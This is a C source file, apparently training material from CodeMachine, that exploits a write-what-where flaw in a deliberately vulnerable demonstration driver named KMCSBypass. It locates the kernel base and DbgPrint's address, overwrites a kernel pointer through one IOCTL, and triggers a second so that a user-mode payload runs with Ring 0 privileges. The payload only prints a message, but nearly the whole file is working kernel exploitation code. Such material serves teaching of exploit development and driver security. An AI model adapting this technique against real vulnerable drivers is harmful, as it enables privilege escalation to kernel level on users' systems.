/////////////////////////////////////////////////////////////////////////////
//
// (c) Copyright 2000-2014 CodeMachine Incorporated. All rights Reserved.
// Developed by CodeMachine Incorporated. (http://www.codemachine.com)
//
/////////////////////////////////////////////////////////////////////////////

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <winioctl.h>

#pragma warning(disable:4054)
#pragma warning(disable:4055)

#define DEVICE_TYPE_KMCSBYPASS          0x434d
#define	DEVICE_NAME_KMCSBYPASS          "\\\\.\\KMCSBypass"
#define IOCTL_WRITEWHATWHERE            CTL_CODE(DEVICE_TYPE_KMCSBYPASS, 0x0001, METHOD_BUFFERED, FILE_ALL_ACCESS)
#define IOCTL_TRIGGERVULNERABILITY      CTL_CODE(DEVICE_TYPE_KMCSBYPASS, 0x0002, METHOD_BUFFERED, FILE_ALL_ACCESS)

#define ARRAY_SIZE 1024

typedef ULONG (*DBGPRINT)( PCHAR  Format, ... ); 
typedef BOOL  ( WINAPI *PENUMDEVICEDRIVERS) ( PVOID *lpImageBase, ULONG cb, PULONG Needed  );

ULONG PayloadFunction ( VOID );

DBGPRINT    g_KernelDbgPrint = NULL;


// enumerate the list of drivers loaded on the system
// and return the module base of the given driver
PUCHAR GetKernelModeBaseAddress ( PCHAR Name ) 
{
    PUCHAR ModuleBase[ARRAY_SIZE];
    ULONG BytesNeeded;
    ULONG ModuleCount, i;
    HMODULE ModuleHandle = NULL;
    PVOID EnumDeviceDriversFn = NULL;

    // get the pointer to the Win32 API EnumDeviceDrivers() dynamically
    // EnumDeviceDrivers() is in psapi.dll and in kernelbase.dll
    // ( LoadLibrary() and GetProcAddress() )
    ModuleHandle = LoadLibrary ( "psapi.dll" );

    if ( ! ModuleHandle ) {
        printf( "LoadLibrary() FAILED=%08x\n", GetLastError() );
        goto Exit;
    }

    EnumDeviceDriversFn = (PVOID)GetProcAddress ( ModuleHandle, "EnumDeviceDrivers" );

    if ( ! EnumDeviceDriversFn ) {
        printf( "GetProcAddress(EnumDeviceDrivers) FAILED=%08x\n", GetLastError() );
        goto Exit;
    }

    // get a list of kernel modules
    if( ! ((PENUMDEVICEDRIVERS)EnumDeviceDriversFn) (ModuleBase, sizeof(ModuleBase), &BytesNeeded)  ) {
        printf( "EnumDeviceDriversFn() FAILED=%08x\n", GetLastError() );
        goto Exit;
    }
    
    if ( BytesNeeded > sizeof(ModuleBase) ) {
        printf( "Buffer Too Small : Need %u bytes\n", BytesNeeded );
        goto Exit;
    }

    ModuleCount = BytesNeeded / sizeof(PUCHAR);

    // iterate through the list and find the required module
    for (i=0; i < ModuleCount; i++ ) {
        CHAR ModuleName[256];

        if( GetDeviceDriverBaseName(
            ModuleBase[i], 
            ModuleName, 
            sizeof(ModuleName) / sizeof (CHAR) ) ) {

            if ( _stricmp ( ModuleName, Name ) == 0 ) {
                return ModuleBase[i];
            }
        }
    }

Exit :
    return NULL;
}

// use the OS Kernel image to find the offset of 
// the given exported function
ULONG GetKernelExportAddress ( PCHAR FunctionName ) 
{
    PUCHAR FunctionPointer = NULL;
    ULONG  FunctionOffset = 0;
    HMODULE NTOSKernelHandle = NULL;
    CHAR   NTOSKernelFileName[MAX_PATH];

    // Get the path to the system32 directory in NTOSKernelFileName
    GetSystemDirectory ( NTOSKernelFileName,  sizeof ( CHAR ) * MAX_PATH );

    // Append the name of the OS kernel image to NTOSKernelFileName
    strcat ( NTOSKernelFileName, "\\NTOSKrnl.exe" );

    // Load the OS kernel as a DLL into user mode
    NTOSKernelHandle = LoadLibraryEx ( NTOSKernelFileName, NULL, DONT_RESOLVE_DLL_REFERENCES  );
    if ( NTOSKernelHandle == NULL ) {
        printf ( "LoadLibraryEx(%s) FAIL=%d\n", NTOSKernelFileName, GetLastError() );
        goto Exit;
    }

    // Retrieve the address of the required function
    FunctionPointer = (PUCHAR)GetProcAddress ( NTOSKernelHandle, FunctionName );
    if ( FunctionPointer == NULL ) {
        printf ( "GetProcAddress(%s) FAIL=%d\n", FunctionName, GetLastError() );
        goto Exit;
    }

    // Convert the address to an offset
    FunctionOffset = (ULONG)( (PUCHAR)FunctionPointer - (PUCHAR)NTOSKernelHandle );

Exit :
    if ( NTOSKernelHandle ) {
        // Unload the OS kernel from user mode
        FreeLibrary ( NTOSKernelHandle );
    }

    return FunctionOffset;
} // GetKernelExportAddress()


// call a vulnerable driver in kernel mode to 
// trigger a code execution vulnerability
ULONG
ExploitDriver ( 
    PVOID ExploitFunction )
{
    HANDLE  FileHandle =  INVALID_HANDLE_VALUE;
    ULONG   BytesTransfered;
    ULONG   FunctionReturn  = 0;

    // Step #1 : Obtain a handle to the driver (CreateFile()) by device name (DEVICE_NAME_KMCSBYPASS)
    // and store it in the local variable FileHandle
    if (INVALID_HANDLE_VALUE == (FileHandle = CreateFile(DEVICE_NAME_KMCSBYPASS, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)))
    {
        printf("ERROR CreateFile (%x)\n", GetLastError());
        goto Exit;
    }

    // Step #2 : Exploit the write-what-where vulnerability (DeviceIoControl(IOCTL_WRITEWHATWHERE))
    // to overwrite a pointer with a attacker controlled value that points to a user mode payload 
    // function i.e.ExploitFunction()
    if (!DeviceIoControl(FileHandle, (DWORD)IOCTL_WRITEWHATWHERE, &ExploitFunction, (DWORD)sizeof(ExploitFunction), NULL, 0, (PDWORD)&BytesTransfered, NULL))
    {
        printf("ERROR DeviceIoControl (%x)\n", GetLastError());
        goto Exit;
    }

    // Step #3 : Trigger the vulnerability (DeviceIoControl(IOCTL_TRIGGERVULNERABILITY)) to invoke the 
    // function at the pointer sent to kernel mode previously using the write-what-where vulnerability 
    // and store the output value in the local variable FunctionReturn.
    if (!DeviceIoControl(FileHandle, (DWORD)IOCTL_TRIGGERVULNERABILITY, NULL, 0, (PVOID)&FunctionReturn, (DWORD)sizeof(FunctionReturn), &BytesTransfered, NULL))
    {
        printf("ERROR DeviceIoControl (%x)\n", GetLastError());
        goto Exit;
    }

    // payload function should have executed already

Exit :
    // Step #4 : close the handle and exit out
    CloseHandle(FileHandle);

    return FunctionReturn;
} // ExploitDriver()


int __cdecl main( void )
{
    PUCHAR NTOSKernelBase = NULL;
    ULONG FunctionOffset;
    ULONG FunctionReturn = 0;

    printf( "PayloadFunction=%p\n", PayloadFunction );

    // Find the address at which the OS kernel is loaded
    if ( ( NTOSKernelBase = GetKernelModeBaseAddress ( "ntoskrnl.exe" ) ) == NULL ) {
        return 0;
    }

    printf( "NTOSKernelBase=%p\n", NTOSKernelBase );

    // Find the offset of the DbgPrint() function in the kernel
    if ( ( FunctionOffset = GetKernelExportAddress ( "DbgPrint" ) ) == 0 ) {
        return 0;
    }

    // Calculate the address at which DbgPrint() in the kernel 
    // and store it in g_KernelDbgPrint
    g_KernelDbgPrint = (DBGPRINT)(NTOSKernelBase + FunctionOffset);

    printf( "g_KernelDbgPrint=%p\n", (PVOID)g_KernelDbgPrint );

    // exploit the driver to call the user mode payload function
    FunctionReturn = ExploitDriver ( (PVOID)PayloadFunction );

    printf( "PayloadFunction() returned %08x\n", FunctionReturn );
}

// This function will be called from the kernel with
// supervisor privileges (Ring 0)
ULONG PayloadFunction ( VOID )
{
    // Call DbgPrint() in the kernel to display a string
    if ( g_KernelDbgPrint ) {
        g_KernelDbgPrint ( "*** Hello from Kernel Mode ***\n" );
    }

    return 0xdeadbeef;
}

